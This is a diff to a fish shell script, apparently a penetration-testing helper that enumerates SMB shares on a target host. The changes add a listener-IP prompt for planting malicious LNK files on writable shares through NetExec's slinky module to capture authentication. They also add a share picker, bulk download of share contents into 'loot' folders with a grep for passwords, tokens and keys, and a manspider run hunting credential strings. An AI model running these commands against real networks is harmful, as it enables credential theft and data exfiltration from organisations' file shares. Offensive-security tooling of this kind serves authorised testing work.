@@ -96,6 +96,22 @@ Examples:
 
     # Add SMB timeout to avoid common errors
     set -a nxc_auth --smb-timeout 999
+    
+    # Build manspider authentication arguments
+    set manspider_auth
+    if set -q _flag_user
+        set -a manspider_auth -u "$_flag_user"
+    end
+    
+    if set -q _flag_password
+        set -a manspider_auth -p "$_flag_password"
+    else if set -q _flag_hash
+        set -a manspider_auth -H "$_flag_hash"
+    end
+    
+    if set -q _flag_kerb
+        set -a manspider_auth -k
+    end
 
     # Create temporary files
     set hosts_tmp (mktemp)
@@ -196,21 +212,23 @@ Examples:
 
         if test -n "$write_shares"
             ezpz_question "Write malicious LNK file on shares with WRITE permission? [y/N]: "
-            read -l confirm_lnk < /dev/tty
-            or set confirm_lnk "n" # Default to no if timeout
-            set confirm_lnk (string trim $confirm_lnk)
-            
-            if test "$confirm_lnk" = "y" -o "$confirm_lnk" = "Y"
+            if test (ezpz_confirm) -eq 0
                 # Extract tun0 IP address
                 set arch (ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1)
                 
-                if test -z "$arch"
-                    ezpz_warn "Could not determine tun0 IP address. Skipping LNK file creation."
+                ezpz_question "Enter listener IP address:"
+                set listener (ezpz_input $arch)
+                if test -z "$listener"
+                    set listener $arch
+                end
+                
+                if test -z "$listener"
+                    ezpz_warn "Could not determine listener IP address. Skipping LNK file creation."
                 else
                     ezpz_header "Creating malicious LNK files on WRITE shares"
-                    ezpz_cmd "nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$arch"
+                    ezpz_cmd "nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$listener"
                     
-                    nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$arch 2>/dev/null | grep SLINKY | grep -oE '(Created.*|Error.*)'
+                    nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$listener 2>/dev/null | grep SLINKY | grep -oE '(Created.*|Error.*)'
                 end
             end
         end
@@ -230,33 +248,20 @@ Examples:
         }' > $share_names_tmp
 
         # Process each share
-        for share in (cat $share_names_tmp)
+        ezpz_question "Select shares for spidering"
+        set share_options (string join ' ' (cat $share_names_tmp))
+        set choice (ezpz_choose_many $share_options)
+        
+        for share in (string split ' ' $choice)
             test -z "$share"; and continue
             
-            ezpz_question "Spider '$share' share for files? (all/quick/NO): "
-            read -l confirm < /dev/tty
-            or set confirm "NO" # Default to no if timeout
-            set confirm (string trim $confirm)
+            set regex_pattern ".*"
+            set search_desc "all files"
             
-            set regex_pattern ""
-            set search_desc ""
+            ezpz_header "Searching '$share' for $search_desc"
+            ezpz_cmd "nxc smb $target $nxc_auth --spider $share --regex '$regex_pattern'"
             
-            switch $confirm
-                case "all" "ALL" "All" "a"
-                    set regex_pattern ".*"
-                    set search_desc "all files"
-                case "quick" "QUICK" "Quick" "q"
-                    set regex_pattern "\.txt|\.csv|\.xml|\.config|\.cnf|\.conf|\.ini|\.ps1"
-                    set search_desc "config/script/text files"
-                case '*'
-                    continue
-            end
-            
-            if test -n "$regex_pattern"
-                ezpz_header "Searching '$share' for $search_desc"
-                ezpz_cmd "nxc smb $target $nxc_auth --spider $share --regex '$regex_pattern'"
-                
-                nxc smb $target $nxc_auth --spider $share --regex $regex_pattern 2>/dev/null | grep -v '\[.\]' | grep -v '\[dir\]' | tr -s " " | cut -d " " -f 5- | cut -d '[' -f 1 | sed 's/[[:space:]]*$//' | tee $files_tmp
+            nxc smb $target $nxc_auth --spider $share --regex $regex_pattern 2>/dev/null | grep -v '\[.\]' | grep -v '\[dir\]' | tr -s " " | cut -d " " -f 5- | cut -d '[' -f 1 | sed 's/[[:space:]]*$//' | tee $files_tmp
                 
                 if test $pipestatus[1] -eq 124
                     ezpz_warn "Operation timed out. Skipping spider for $share."
@@ -264,63 +269,83 @@ Examples:
                 end
 
                 if test -s $files_tmp
-                    # Skip download operations for Kerberos
-                    if set -q _flag_kerb
-                        ezpz_warn "Download operations skipped for Kerberos authentication."
-                        ezpz_info "Use smbclient.py manually for file downloads with Kerberos."
-                    else
-                        ezpz_question "Download these files? [y/N]"
-                        read -l confirm_dl < /dev/tty
-                        or set confirm_dl "n" # Default to no if timeout
-                        set confirm_dl (string trim $confirm_dl)
-                        if test "$confirm_dl" = "y" -o "$confirm_dl" = "Y"
-                        set dir_path "./$target"_"$share"_loot
-                        mkdir -p $dir_path
-                        ezpz_header "Saving files to $dir_path"
-
-                        # Extract user and password for smbclient
-                        set smb_user $user
-                        set smb_pass ""
-                        set smb_domain ""
-                        
-                        if set -q _flag_password
-                            set smb_pass $_flag_password
-                        end
-                        
-                        if set -q _flag_domain
-                            set smb_domain $_flag_domain
-                        end
-
-                        while read -l file_path_full
-                            test -z "$file_path_full"; and continue
-                            
-                            set share_path "//$target/$share"
-                            # Extract just the filename from the full path (remove //target/share/ prefix)
-                            set file_path (echo "$file_path_full" | sed "s|^//$target/$share/||" | sed "s|/|\\\\|g")
-                            set file_name (basename "$file_path_full")
-                            
-                            if test -n "$smb_domain" -a -n "$smb_pass"
-                                ezpz_cmd "smbclient $share_path -U \"$smb_domain\\\\$smb_user%$smb_pass\" -c \"get \\\"$file_path\\\" \\\"$dir_path/$file_name\\\"\""
-                                smbclient $share_path -U "$smb_domain\\$smb_user%$smb_pass" -c "get \"$file_path\" \"$dir_path/$file_name\"" >/dev/null 2>&1
-                            else if test -n "$smb_pass"
-                                ezpz_cmd "smbclient $share_path -U \"$smb_user%$smb_pass\" -c \"get \\\"$file_path\\\" \\\"$dir_path/$file_name\\\"\""
-                                smbclient $share_path -U "$smb_user%$smb_pass" -c "get \"$file_path\" \"$dir_path/$file_name\"" >/dev/null 2>&1
-                            else
-                                ezpz_cmd "smbclient $share_path -c \"get \\\"$file_path\\\" \\\"$dir_path/$file_name\\\"\""
-                                smbclient $share_path -c "get \"$file_path\" \"$dir_path/$file_name\"" >/dev/null 2>&1
+                    ezpz_question "Select follow-up action:"
+                    set action (ezpz_choose_one 'download all' manspider skip)
+                    
+                    switch $action
+                        case 'download all'
+                            # Skip download operations for Kerberos
+                            if set -q _flag_kerb
+                                ezpz_warn "Download operations skipped for Kerberos authentication."
+                                ezpz_info "Use smbclient.py manually for file downloads with Kerberos."
+                                continue
                             end
-                        end < $files_tmp
+                                set dir_path "./$target"_"$share"_loot
+                                mkdir -p $dir_path
+                                ezpz_header "Saving files to $dir_path"
 
-                        if test -d $dir_path
-                            ezpz_header "Searching for secrets in downloaded files..."
-                            set secret_pattern "password|passwd|secret|key|token|cred|connstr"
-                            ezpz_cmd "grep -iE -r \"$secret_pattern\" \"$dir_path\""
-                            # Use -a flag to treat binary files as text and handle special characters
-                            grep -iE -r -a --color=always $secret_pattern $dir_path 2>/dev/null
-                            if test $status -ne 0
-                                ezpz_info "No secrets found in downloaded files."
-                            end
-                        end
+                                # Extract user and password for smbclient
+                                set smb_user $user
+                                set smb_pass ""
+                                set smb_domain ""
+                                
+                                if set -q _flag_password
+                                    set smb_pass $_flag_password
+                                end
+                                
+                                if set -q _flag_domain
+                                    set smb_domain $_flag_domain
+                                end
+
+                                while read -l file_path_full
+                                    test -z "$file_path_full"; and continue
+                                    
+                                    set share_path "//$target/$share"
+                                    # Extract just the filename from the full path (remove //target/share/ prefix)
+                                    set file_path (echo "$file_path_full" | sed "s|^//$target/$share/||" | sed "s|/|\\\\|g")
+                                    set file_name (basename "$file_path_full")
+                                    
+                                    if test -n "$smb_domain" -a -n "$smb_pass"
+                                        ezpz_cmd "smbclient $share_path -U \"$smb_domain\\\\$smb_user%$smb_pass\" -c \"get \\\"$file_path\\\" \\\"$dir_path/$file_name\\\"\""
+                                        smbclient $share_path -U "$smb_domain\\$smb_user%$smb_pass" -c "get \"$file_path\" \"$dir_path/$file_name\"" >/dev/null 2>&1
+                                    else if test -n "$smb_pass"
+                                        ezpz_cmd "smbclient $share_path -U \"$smb_user%$smb_pass\" -c \"get \\\"$file_path\\\" \\\"$dir_path/$file_name\\\"\""
+                                        smbclient $share_path -U "$smb_user%$smb_pass" -c "get \"$file_path\" \"$dir_path/$file_name\"" >/dev/null 2>&1
+                                    else
+                                        ezpz_cmd "smbclient $share_path -c \"get \\\"$file_path\\\" \\\"$dir_path/$file_name\\\"\""
+                                        smbclient $share_path -c "get \"$file_path\" \"$dir_path/$file_name\"" >/dev/null 2>&1
+                                    end
+                                end < $files_tmp
+
+                                if test -d $dir_path
+                                    ezpz_header "Searching for secrets in downloaded files..."
+                                    set secret_pattern "password|passwd|secret|key|token|cred|connstr"
+                                    ezpz_cmd "grep -iE -r \"$secret_pattern\" \"$dir_path\""
+                                    # Use -a flag to treat binary files as text and handle special characters
+                                    grep -iE -r -a --color=always $secret_pattern $dir_path 2>/dev/null
+                                    if test $status -ne 0
+                                        ezpz_info "No secrets found in downloaded files."
+                                    end
+                                end
+                            
+                            case manspider
+                                ezpz_question "Enter content regex strings"
+                                set content (ezpz_input "cred passw")
+                                if test -z "$content"
+                                    set content "cred passw"
+                                end
+                                
+                                set dir_path "./manspider/$share"
+                                mkdir -p $dir_path
+                                
+                                ezpz_header "Running manspider on $share"
+                                ezpz_info "Saving files to $dir_path"
+                                ezpz_cmd "manspider $target $manspider_auth --sharenames $share -c $content -l $dir_path --threads 512"
+                                
+                                manspider $target $manspider_auth --sharenames $share -c $content -l $dir_path --threads 512
+                                
+                            case skip
+                                # Skip this share - no action needed
                         end
                     end
                 else
